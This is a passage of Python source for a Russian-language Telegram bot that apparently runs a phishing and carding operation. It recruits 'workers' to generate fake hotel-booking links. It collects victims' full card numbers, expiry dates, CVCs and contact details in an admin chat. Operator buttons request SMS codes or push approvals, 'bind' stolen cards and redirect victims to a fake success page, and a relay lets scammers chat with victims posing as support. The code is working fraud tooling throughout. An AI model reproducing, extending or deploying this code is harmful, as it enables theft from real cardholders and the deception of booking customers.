        if any(keyword in line for keyword in ['Номер:', 'Срок:', 'CVC:']):
            new_text += line + "\n"
    
    new_text += f"\n{status_text}\n\n"
    new_text += "Выберите действие:"
    
    await callback.message.edit_text(
        new_text,
        reply_markup=get_payment_buttons(payment_id, user_id, card_number),
        parse_mode="HTML"
    )
    return success

# ========== ОБРАБОТЧИКИ ПЛАТЕЖЕЙ ==========
@dp.callback_query(F.data.startswith("sms:"))
async def sms_code_handler(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Извлекаем номер карты из сообщения
    card_number = extract_card_number(callback.message.text)
    
    await update_payment_status(
        callback, payment_id, user_id, 
        "📱 <b>Статус: SMS код запрошен</b>", 
        "sms",
        card_number
    )
    await callback.answer("SMS код запрошен")

@dp.callback_query(F.data.startswith("push:"))
async def push_handler(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Извлекаем номер карты из сообщения
    card_number = extract_card_number(callback.message.text)
    
    await update_payment_status(
        callback, payment_id, user_id,
        "🔔 <b>Статус: Пуш отправлен</b>", 
        "push",
        card_number
    )
    await callback.answer("Пуш отправлен")

@dp.callback_query(F.data.startswith("wrong_card:"))
async def wrong_card_handler(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Извлекаем номер карты из сообщения
    card_number = extract_card_number(callback.message.text)
    
    await update_payment_status(
        callback, payment_id, user_id,
        "❌ <b>Статус: Карта отклонена</b>", 
        "wrong_card",
        card_number
    )
    await callback.answer("Карта отклонена")
    
@dp.callback_query(F.data.startswith("wrong_sms:"))
async def wrong_sms_handler(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Просто отправляем команду SSE БЕЗ изменения сообщения
    success = await send_sse_command(user_id, "wrong_sms", payment_id)
    
    if success:
        await callback.answer("❌ SMS код отклонен")
    else:
        await callback.answer("❌ Ошибка отправки команды")

@dp.callback_query(F.data.startswith("bind:"))
async def bind_card_handler(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    payment_id = parts[1]
    user_id = parts[2]
    
    # Извлекаем номер карты из сообщения
    card_number = extract_card_number(callback.message.text)
    
    logger.info(f"🔧 Привязка карты {card_number}, user_id: {user_id}")
    
    # Сохраняем карту в БД
    success = save_card_to_db(card_number)
    
    if success:
        # ОТПРАВЛЯЕМ КОМАНДУ ДЛЯ РЕДИРЕКТА НА SUCCESS
        await send_sse_command(user_id, "success", payment_id)
        
        await update_payment_status(
            callback, payment_id, user_id,
            "✅ <b>Статус: Карта привязана</b>\n📋 <b>Клиент перенаправлен на страницу успеха</b>", 
            "bind",
            card_number
        )
        await callback.answer("✅ Карта привязана")
    else:
        await callback.answer("❌ Ошибка привязки карты")

# ========== ОБРАБОТКА ПЛАТЕЖНЫХ ДАННЫХ ==========
@dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID]))
async def handle_operator_messages(message: types.Message, state: FSMContext):
    logger.info(f"📨 АДМИН: Тип: {message.content_type}, Текст: {message.text}")
    
    if message.text and ("👤 Клиент:" in message.text or "• Имя:" in message.text):
        logger.info("💰 ОБНАРУЖЕНЫ ПЛАТЕЖНЫЕ ДАННЫЕ!")
        await process_payment_data(message)

async def process_payment_data(message: types.Message):
    try:
        lines = message.text.split('\n')
        payment_data = {}

        for line in lines:
            line = line.strip()
            if 'Имя:' in line:
                payment_data['first_name'] = line.split('Имя:')[1].strip()
            elif 'Фамилия:' in line:
                payment_data['last_name'] = line.split('Фамилия:')[1].strip()
            elif 'Email:' in line:
                payment_data['email'] = line.split('Email:')[1].strip()
            elif 'Телефон:' in line:
                payment_data['phone'] = line.split('Телефон:')[1].strip()
            elif 'Номер:' in line:
                payment_data['card_number'] = line.split('Номер:')[1].strip()
            elif 'Срок:' in line:
                payment_data['card_expiry'] = line.split('Срок:')[1].strip()
            elif 'CVC:' in line:
                payment_data['cvc'] = line.split('CVC:')[1].strip()

        # Проверяем карту в БД
        card_number = payment_data.get('card_number', '')
        is_card_bound = check_card_in_db(card_number)
        
        # ЕСЛИ КАРТА УЖЕ ПРИВЯЗАНА - ОТПРАВЛЯЕМ СПЕЦИАЛЬНОЕ СООБЩЕНИЕ
        if is_card_bound:
            bound_message = f"""
🔄 <b>ПОВТОРНАЯ ЗАЯВКА - КАРТА УЖЕ ПРИВЯЗАНА</b>

👤 <b>Клиент:</b>
• Имя: {payment_data.get('first_name', '')}
• Фамилия: {payment_data.get('last_name', '')}
• Email: {payment_data.get('email', '')}
• Телефон: {payment_data.get('phone', '')}

💳 <b>Карта:</b> (УЖЕ ПРИВЯЗАНА)
• Номер: {card_number}
• Срок: {payment_data.get('card_expiry', '')}
• CVC: {payment_data.get('cvc', '')}

📋 <b>Статус:</b> Заявка поставлена в очередь
"""

            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=bound_message,
                parse_mode="HTML"
            )
            return

        # НАХОДИМ КТО СОЗДАЛ ССЫЛКУ
        creator_info = get_link_creator_info(f"temp_{int(time.time())}")

        # СОЗДАЕМ ПЛАТЕЖ БЕЗ СОХРАНЕНИЯ ДАННЫХ КАРТ
        payment_id = save_payment(
            user_id=0,
            first_name=payment_data.get('first_name', ''),
            last_name=payment_data.get('last_name', ''),
            email=payment_data.get('email', ''),
            phone=payment_data.get('phone', ''),
            card_number=payment_data.get('card_number', ''),
            card_expiry=payment_data.get('card_expiry', ''),
            cvc=payment_data.get('cvc', '')
        )

        if payment_id:
            # Проверяем статус карты В БД СРАЗУ
            card_number = payment_data.get('card_number', '')
            card_status = "ПРИВЯЗАННАЯ КАРТА" if is_card_bound else "НЕПРИВЯЗАННАЯ КАРТА"
            
            # Форматируем сообщение в новом стиле СРАЗУ
            formatted_text = f"💳 <b>{card_status}</b>\n\n"
            formatted_text += f"👤 <b>Воркер:</b> {creator_info}\n\n"  # ← ДОБАВЛЯЕМ ВОРКЕРА
            formatted_text += "👤 <b>Клиент:</b>\n"
            formatted_text += f"• Имя: {payment_data.get('first_name', '')}\n"
            formatted_text += f"• Фамилия: {payment_data.get('last_name', '')}\n"
            formatted_text += f"• Email: {payment_data.get('email', '')}\n"
            formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
            formatted_text += "💳 <b>Карта:</b>\n"
            formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
            formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
            formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
            formatted_text += "Выберите действие:"
            
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=formatted_text,
                reply_markup=get_payment_buttons(payment_id, "user123", card_number),
                parse_mode="HTML"
            )
            logger.info(f"✅ Платеж #{payment_id} создан")

    except Exception as e:
        logger.error(f"💥 Ошибка обработки платежа: {e}")

# ★★★ ОБРАБОТКА КОМАНДЫ ОПЕРАТОРА ДЛЯ ОТВЕТА В ЧАТ ★★★

@dp.message(F.text.startswith("/reply_"))
async def handle_operator_reply(message: types.Message, state: FSMContext):
    """Оператор отвечает клиенту через команду /reply_USER_ID"""
    try:
        # Извлекаем user_id из команды
        command_parts = message.text.split('_', 1)
        if len(command_parts) < 2:
            await message.answer("❌ Неверный формат команды. Используйте: /reply_USER_ID")
            return
            
        user_id = command_parts[1].strip()
        
        if not user_id:
            await message.answer("❌ Не указан USER_ID клиента")
            return
        
        # Спрашиваем у оператора текст ответа
        await message.answer(
            f"💬 Ответ клиенту `{user_id}`\n\n"
            "Введите ваш ответ:",
            parse_mode="Markdown"
        )
        
        # Сохраняем user_id для следующего сообщения
        await state.update_data(reply_user_id=user_id)
        
    except Exception as e:
        logger.error(f"❌ Ошибка обработки команды reply: {e}")
        await message.answer("❌ Ошибка обработки команды")

# Добавляем обработчик для текста ответа оператора
@dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID, -1003473975732]))
async def handle_operator_message(message: types.Message, state: FSMContext):
    """Обработка сообщений оператора (админский чат, поддержка, SMS-чат)"""
    try:
        # Проверяем, не является ли это ответом клиенту через кнопку
        user_data = await state.get_data()
        reply_user_id = user_data.get('reply_user_id')
        
        if reply_user_id and message.text and not message.text.startswith('/'):
            # Это ответ оператора клиенту через кнопку
            operator_message = message.text
            
            # Отправляем сообщение клиенту через API
            server_url = "https://roomix-production.up.railway.app"
            response = requests.post(
                f"{server_url}/operator_reply",
                json={
                    'user_id': reply_user_id,
                    'message': operator_message
                },
                timeout=5
            )
            
            if response.status_code == 200:
                # Сохраняем в БД через API
                requests.post(
                    f"{server_url}/send_chat_message",
                    json={
                        'user_id': reply_user_id,
                        'message': operator_message,
                        'sender': 'operator'
                    },
                    timeout=5
                )
                
                await message.answer(
                    f"✅ Ответ отправлен клиенту `{reply_user_id}`\n\n"
                    f"💬 Ваш ответ: {operator_message}",
                    parse_mode="Markdown"
                )
                
                # Очищаем состояние
                await state.clear()
                
            else:
                await message.answer("❌ Ошибка отправки ответа клиенту")
                
        # ★★★ АВТОМАТИЧЕСКАЯ ПЕРЕСЫЛКА ИЗ ЛЮБОГО ОПЕРАТОРСКОГО ЧАТА ★★★
        elif message.text and not message.text.startswith('/') and not any(keyword in message.text for keyword in ['👤 Клиент:', '• Имя:', 'Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
            # Это обычное сообщение оператора (не команда и не платежные данные)
            operator_message = message.text
            
            # Находим последнего клиента из истории чата
            conn = get_db_connection()
            if conn:
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT user_id FROM chat_messages WHERE sender = %s ORDER BY created_at DESC LIMIT 1',
                    ('client',)
                )
                result = cursor.fetchone()
                conn.close()
                
                if result:
                    last_client_id = result[0]
                    
                    # Отправляем сообщение клиенту
                    server_url = "https://roomix-production.up.railway.app"
                    response = requests.post(
                        f"{server_url}/operator_reply",
                        json={
                            'user_id': last_client_id,
                            'message': operator_message
                        },
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        # Сохраняем в БД
                        requests.post(
                            f"{server_url}/send_chat_message",
                            json={
                                'user_id': last_client_id,
                                'message': operator_message,
                                'sender': 'operator'
                            },
                            timeout=5
                        )
                        
                        await message.answer(
                            f"✅ Ответ отправлен последнему клиенту `{last_client_id}`\n\n"
                            f"💬 Ваш ответ: {operator_message}",
                            parse_mode="Markdown"
                        )
                    else:
                        await message.answer("❌ Не удалось отправить ответ клиенту")
                else:
                    await message.answer("❌ Не найден активный клиент для ответа")
            else:
                await message.answer("❌ Ошибка подключения к БД")
                
        # Если это платежные данные, обрабатываем их
        elif message.text and any(keyword in message.text for keyword in ['👤 Клиент:', '• Имя:', 'Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
            await process_payment_data(message)
            
    except Exception as e:
        logger.error(f"❌ Ошибка обработки сообщения оператора: {e}")
        await message.answer("❌ Ошибка обработки сообщения")

# ========== ОСТАЛЬНЫЕ ОБРАБОТЧИКИ БОТА ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        await message.answer("👋 Админ панель готова к работе!")
        return
        
    user_id = message.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
        await bot.send_photo(
            chat_id=user_id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    elif user_status == 'rejected':
        welcome_text = """
👋 <b>Добро пожаловать!</b>

К сожалению, ваша предыдущая заявка была отклонена.
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
    else:
        welcome_text = """
👋 <b>Добро пожаловать!</b>

Это бот для подачи заявки на участие в проекте.

Чтобы начать, нажмите кнопку ниже 👇
"""
        await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")


@dp.message(F.text == "🏠 Главное меню")
async def main_menu(message: types.Message):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)
    if user_status == 'accepted':
        welcome_text = """
🎉 <b>Главное меню</b>

Добро пожаловать в нашу команду!
"""
        await bot.send_photo(
            chat_id=message.from_user.id,
            photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
            caption=welcome_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    else:
        await message.answer("👋 Для начала работы нажмите '📝 Оставить заявку'", reply_markup=main_kb)

@dp.message(F.text == "📝 Оставить заявку")
async def start_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    user_status = get_user_status(message.from_user.id)

    if user_status == 'accepted':
        await message.answer("✅ Вы уже приняты в команду!", reply_markup=accepted_kb)
        return
    elif user_status == 'rejected':
        await message.answer("❌ Ваша предыдущая заявка была отклонена", reply_markup=main_kb)
        return
    elif user_status == 'pending':
        await message.answer("⏳ Ваша заявка уже на рассмотрении", reply_markup=main_kb)
        return

    await state.set_state(ApplicationStates.waiting_for_time)
    question_text = """
⏰ <b>Первый вопрос:</b>

Сколько часов в день вы готовы уделять работе?
(Напишите число, например: 4, 6, 8)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(F.text == "❌ Отменить заявку")
async def cancel_application(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    await state.clear()
    await message.answer("❌ Заявка отменена", reply_markup=main_kb)

@dp.message(ApplicationStates.waiting_for_time)
async def process_time(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    time_answer = message.text.strip()

    if not time_answer.isdigit():
        await message.answer("❌ Пожалуйста, введите число (например: 4, 6, 8)")
        return

    hours = int(time_answer)
    if hours > 24:
        await message.answer("❌ В сутках всего 24 часа! Введите реальное число")
        return

    await state.update_data(time=time_answer)
    await state.set_state(ApplicationStates.waiting_for_experience)

    question_text = """
💼 <b>Второй вопрос:</b>

Какой у вас опыт работы в этой сфере?
(Опишите кратко ваш опыт)
"""
    await message.answer(question_text, reply_markup=cancel_kb, parse_mode="HTML")

@dp.message(ApplicationStates.waiting_for_experience)
async def process_experience(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    experience = message.text.strip()

    if len(experience) < 5:
        await message.answer("❌ Пожалуйста, опишите опыт более подробно")
        return

    await state.update_data(experience=experience)
    await state.set_state(ApplicationStates.confirmation)

    user_data = await state.get_data()
    confirmation_text = f"""
📋 <b>Проверьте вашу заявку:</b>

⏰ <b>Время:</b> {user_data['time']} часов/день
💼 <b>Опыт:</b> {user_data['experience']}

Всё верно?
"""
    await message.answer(confirmation_text, reply_markup=confirm_kb, parse_mode="HTML")

@dp.message(ApplicationStates.confirmation)
async def process_confirmation(message: types.Message, state: FSMContext):
    if message.chat.id == ADMIN_CHAT_ID:
        return
        
    if message.text == "✅ Отправить заявку":
        user_data = await state.get_data()

        # ИСПРАВЛЕННОЕ СОХРАНЕНИЕ ЗАЯВКИ
        application_id = save_application(
            user_id=message.from_user.id,
            username=message.from_user.username,
            first_name=message.from_user.first_name,
            time=user_data['time'],
            experience=user_data['experience']
        )

        if application_id is None:
            await message.answer("❌ Ошибка сохранения заявки. Попробуйте позже.", reply_markup=main_kb)
            await state.clear()
            return

        application_text = f"""
🚨 <b>НОВАЯ ЗАЯВКА #{application_id}</b>

👤 <b>Пользователь:</b>
ID: {message.from_user.id}
Username: @{message.from_user.username or 'Нет'}
Имя: {message.from_user.first_name or ''}

📋 <b>Данные заявки:</b>
⏰ Время: {user_data['time']} часов/день
💼 Опыт: {user_data['experience']}

🕒 Время подачи: {message.date.strftime('%d.%m.%Y %H:%M')}
"""
        try:
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=application_text,
                reply_markup=get_admin_buttons(application_id),
                parse_mode="HTML"
            )

            success_text = """
✅ <b>Заявка отправлена!</b>

Спасибо за вашу заявку! Мы рассмотрим её в ближайшее время и свяжемся с вами.

Ожидайте решения...
"""
            await message.answer(success_text, reply_markup=accepted_kb, parse_mode="HTML")
        except Exception as e:
            await message.answer("❌ Произошла ошибка при отправки заявки. Попробуйте позже.", reply_markup=main_kb)

        await state.clear()

    elif message.text == "🔄 Заполнить заново":
        await state.clear()
        await start_application(message, state)
    else:
        await message.answer("❌ Пожалуйста, используйте кнопки ниже")

@dp.callback_query(F.data == "profile")
async def show_profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_status = get_user_status(user_id)

    if user_status == 'accepted':
        join_date = get_join_date(user_id)
        
        # НОВЫЙ ПРОФИЛЬ КАК НА СКРИНШОТЕ
        profile_text = f"""
<b>👤 Ваш профиль</b>

• Telegram ID: {user_id}
• Баланс: 0 RUB
• Тип ставки: 5

────────────────
<b>Успешных профилей:</b> 0
• Общая сумма профилей: 0 RUB

<b>Вы пригласили:</b> 0
• Заработано на рефералах: 0 RUB
• Статус: Воркер
• В команде: 0 дней

────────────────
<b>Статус проекта:</b> WORK
"""
        await callback.message.delete()
        await callback.message.answer(
            profile_text,
            reply_markup=profile_kb,
            parse_mode="HTML"
        )
    else:
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
    await callback.answer()

@dp.callback_query(F.data.startswith("accept_"))
async def accept_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = get_db_connection()
    if conn is None:
        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
        return
        
    cursor = conn.cursor()
    try:
        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
        conn.commit()

        cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
        application = cursor.fetchone()
        
        if application:
            user_id, time, experience = application

            user_message = """
🎉 <b>Поздравляем! Ваша заявка принята!</b>

Мы рады приветствовать вас в нашей команде!
"""
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=user_message,
                    parse_mode="HTML"
                )

                welcome_text = """
🎉 <b>Добро пожаловать в команду!</b>

Вы успешно прошли отбор и теперь являетесь частью нашего проекта.
"""
                await bot.send_photo(
                    chat_id=int(user_id),
                    photo="https://images.unsplash.com/photo-1521737711867-e3b97375f902?auto=format&fit=crop&w=800&q=80",
                    caption=welcome_text,
                    reply_markup=profile_kb,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")

            await callback.message.edit_text(
                f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
                f"Пользователь уведомлен о решении.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Ошибка принятия заявки: {e}")
        await callback.answer("❌ Ошибка принятия заявки", show_alert=True)
    finally:
        conn.close()

    await callback.answer()

@dp.callback_query(F.data.startswith("reject_"))
async def reject_application(callback: types.CallbackQuery):
    application_id = callback.data.split("_")[1]

    conn = get_db_connection()
    if conn is None:
        await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
        return
        
    cursor = conn.cursor()
    try:
        cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
        conn.commit()

        cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
        application = cursor.fetchone()
        
        if application:
            user_id = application[0]

            user_message = """
😔 <b>К сожалению, ваша заявка отклонена.</b>

Спасибо за проявленный интерес! В данный момент мы не можем предложить вам сотрудничество.

Желаем удачи в будущих проектах!
"""
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=user_message,
                    reply_markup=main_kb,
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")

            await callback.message.edit_text(
                f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
                f"Пользователь уведомлен о решении.",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Ошибка отклонения заявки: {e}")
        await callback.answer("❌ Ошибка отклонения заявки", show_alert=True)
    finally:
        conn.close()

    await callback.answer()

# ========== ОБРАБОТЧИКИ ДЛЯ СИСТЕМЫ ССЫЛОК ==========

# Обработчик кнопки "Создать ссылку"
@dp.callback_query(F.data == "create_link")
async def create_link_start(callback: types.CallbackQuery, state: FSMContext):
    user_status = get_user_status(callback.from_user.id)
    if user_status != 'accepted':
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
    
    await state.set_state(LinkStates.waiting_for_name)
    
    await callback.message.answer(
        "🔗 <b>Создание ссылки для бронирования</b>\n\n"
        "📝 <b>Шаг 1 из 5:</b> Введите название номера\n\n"
        "<i>Пример:</i> <code>Премиум Люкс с видом на город</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_profile")]
        ])
    )
    await callback.answer()

# Обработчик кнопки "Мои ссылки"
@dp.callback_query(F.data == "my_links")
async def show_my_links(callback: types.CallbackQuery):
    user_status = get_user_status(callback.from_user.id)
    if user_status != 'accepted':
        await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
        return
    
    links = get_user_links(callback.from_user.id)
    
    if not links:
        await callback.message.answer(
            "📋 <b>Мои ссылки</b>\n\n"
            "У вас еще нет созданных ссылок.\n"
            "Нажмите «Создать ссылку» чтобы начать.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔗 Создать ссылку", callback_data="create_link")],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_profile")]
            ])
        )
    else:
        links_text = "📋 <b>Мои ссылки:</b>\n\n"
        for link in links:
            links_text += f"🔗 <b>{link['name']}</b>\n"
            links_text += f"   💰 {link['price']} PLN\n"
            links_text += f"   📍 {link['location']}\n"
            links_text += f"   🌐 <code>https://roomix.pw/{link['code']}</code>\n\n"
        
        await callback.message.answer(
            links_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔗 Создать еще", callback_data="create_link")],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_profile")]
            ])
        )
    await callback.answer()

# Обработчик кнопки "Назад" в профиль
@dp.callback_query(F.data == "back_to_profile")
async def back_to_profile(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await show_profile(callback)

# Шаг 1: Название
@dp.message(LinkStates.waiting_for_name)
async def process_link_name(message: types.Message, state: FSMContext):
    name = message.text.strip()
    
    if len(name) < 3:
        await message.answer("❌ Название должно быть не менее 3 символов. Попробуйте еще раз:")
        return
    
    await state.update_data(link_name=name)
    await state.set_state(LinkStates.waiting_for_price)
    
    await message.answer(
        "💰 <b>Шаг 2 из 5:</b> Введите цену за ночь (в PLN)\n\n"
        "<i>Пример:</i> <code>450</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_name")]
        ])
    )

# Шаг 2: Цена
@dp.message(LinkStates.waiting_for_price)
async def process_link_price(message: types.Message, state: FSMContext):
    price_text = message.text.strip()
    
    if not price_text.isdigit():
        await message.answer("❌ Цена должна быть числом. Попробуйте еще раз:")
        return
    
    price = int(price_text)
    if price < 10 or price > 10000:
        await message.answer("❌ Цена должна быть от 10 до 10000 PLN. Попробуйте еще раз:")
        return
    
    await state.update_data(price=price)
    await state.set_state(LinkStates.waiting_for_location)
    
    await message.answer(
        "📍 <b>Шаг 3 из 5:</b> Введите страну и город\n\n"
        "<i>Пример:</i> <code>Польша, Варшава</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_price")]
        ])
    )

# Шаг 3: Локация
@dp.message(LinkStates.waiting_for_location)
async def process_link_location(message: types.Message, state: FSMContext):
    location = message.text.strip()
    
    if len(location) < 2:
        await message.answer("❌ Локация должна быть не менее 2 символов. Попробуйте еще раз:")
        return
    
    await state.update_data(location=location)
    await state.set_state(LinkStates.waiting_for_photos)
    
    await message.answer(
        "🖼️ <b>Шаг 4 из 5:</b> Пришлите фотографии номера\n\n"
        "📎 Можно отправить несколько фото сразу\n"
        "📎 <b>Минимум:</b> 1 фото\n"
        "📎 <b>Максимум:</b> 5 фото\n\n"
        "<i>Просто пришлите фото как обычное сообщение 📸</i>\n\n"
        "<b>После загрузки всех фото нажмите «✅ Готово»</b>\n"
        "<i>(кнопки появятся после первого фото)</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➡️ Пропустить", callback_data="skip_photos")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_location")]
        ])
    )

# Шаг 4: Фотографии (исправленная версия - кнопки показываем только один раз)
@dp.message(LinkStates.waiting_for_photos, F.photo)
async def process_link_photos(message: types.Message, state: FSMContext):
    try:
        # Получаем самое качественное фото
        photo = message.photo[-1]
        file_id = photo.file_id
        
        # Получаем file_path для создания прямой ссылки
        file = await bot.get_file(file_id)
        file_path = file.file_path
        
        # Создаем прямую ссылку на фото
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        
        user_data = await state.get_data()
        current_photos = user_data.get('photos', [])
        
        # Добавляем фото в список
        current_photos.append(photo_url)
        
        # Ограничиваем максимум 5 фото
        if len(current_photos) > 5:
            current_photos = current_photos[:5]
            await message.answer("⚠️ Загружено максимальное количество фото (5). Автоматически переходим к подтверждению...")
            await state.update_data(photos=current_photos)
            await process_photos_complete(message, state)
            return
        
        await state.update_data(photos=current_photos)
        
        # Показываем просто счетчик без кнопок
        progress_text = f"📸 Фото {len(current_photos)}/5 сохранено"
        
        # Если это первое фото - показываем кнопки
        if len(current_photos) == 1:
            progress_text += "\n\n✅ Минимальное количество фото загружено!\n"
            progress_text += "Можете загрузить еще фото или нажать «✅ Готово»"
            
            await message.answer(
                progress_text,
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Готово", callback_data="photos_done")],
                    [InlineKeyboardButton(text="➡️ Пропустить добавление", callback_data="skip_photos")],
                    [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_location")]
                ])
            )
        else:
            # Для последующих фото просто показываем счетчик
            await message.answer(progress_text)
        
        # Автоматический переход если достигли максимума
        if len(current_photos) >= 5:
            await message.answer("✅ Загружено максимальное количество фото (5). Переходим к подтверждению...")
            await process_photos_complete(message, state)
            
    except Exception as e:
        logger.error(f"❌ Ошибка обработки фото: {e}")
        await message.answer("❌ Ошибка загрузки фото. Попробуйте еще раз.")

# Обработчик для документов-изображений (исправленный)
@dp.message(LinkStates.waiting_for_photos, F.document)
async def process_link_documents(message: types.Message, state: FSMContext):
    if message.document.mime_type and message.document.mime_type.startswith('image/'):
        try:
            file_id = message.document.file_id
            file = await bot.get_file(file_id)
            file_path = file.file_path
            photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            
            user_data = await state.get_data()
            current_photos = user_data.get('photos', [])
            current_photos.append(photo_url)
            
            # Ограничиваем максимум 5 фото
            if len(current_photos) > 5:
                current_photos = current_photos[:5]
                await message.answer("⚠️ Загружено максимальное количество фото (5). Автоматически переходим к подтверждению...")
                await state.update_data(photos=current_photos)
                await process_photos_complete(message, state)
                return
            
            await state.update_data(photos=current_photos)
            
            # Показываем просто счетчик без кнопок
            progress_text = f"📸 Фото {len(current_photos)}/5 сохранено"
            
            # Если это первое фото - показываем кнопки
            if len(current_photos) == 1:
                progress_text += "\n\n✅ Минимальное количество фото загружено!\n"
                progress_text += "Можете загрузить еще фото или нажать «✅ Готово»"
                
                await message.answer(
                    progress_text,
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✅ Готово", callback_data="photos_done")],
                        [InlineKeyboardButton(text="➡️ Пропустить добавление", callback_data="skip_photos")],
                        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_location")]
                    ])
                )
            else:
                # Для последующих фото просто показываем счетчик
                await message.answer(progress_text)
            
            # Автоматический переход если достигли максимума
            if len(current_photos) >= 5:
                await message.answer("✅ Загружено максимальное количество фото (5). Переходим к подтверждению...")
                await process_photos_complete(message, state)
                
        except Exception as e:
            logger.error(f"❌ Ошибка обработки документа: {e}")
            await message.answer("❌ Ошибка загрузки файла.")
    else:
        await message.answer("❌ Пожалуйста, отправьте изображение (фото)")

# Кнопка "Готово" - исправленная версия
@dp.callback_query(F.data == "photos_done")
async def photos_done_handler(callback: types.CallbackQuery, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    if not photos:
        await callback.answer("❌ Нужно хотя бы 1 фото", show_alert=True)
        return
    
    await callback.message.delete()
    await process_photos_complete(callback.message, state)
    await callback.answer()

# Кнопка "Пропустить" - используем стандартные фото
@dp.callback_query(F.data == "skip_photos")
async def skip_photos_handler(callback: types.CallbackQuery, state: FSMContext):
    user_data = await state.get_data()
    
    # Используем стандартные фото если пользователь пропустил
    default_photos = [
        "https://images.unsplash.com/photo-1571896349842-33c89424de2d?auto=format&fit=crop&w=800&q=80",
        "https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=800&q=80",
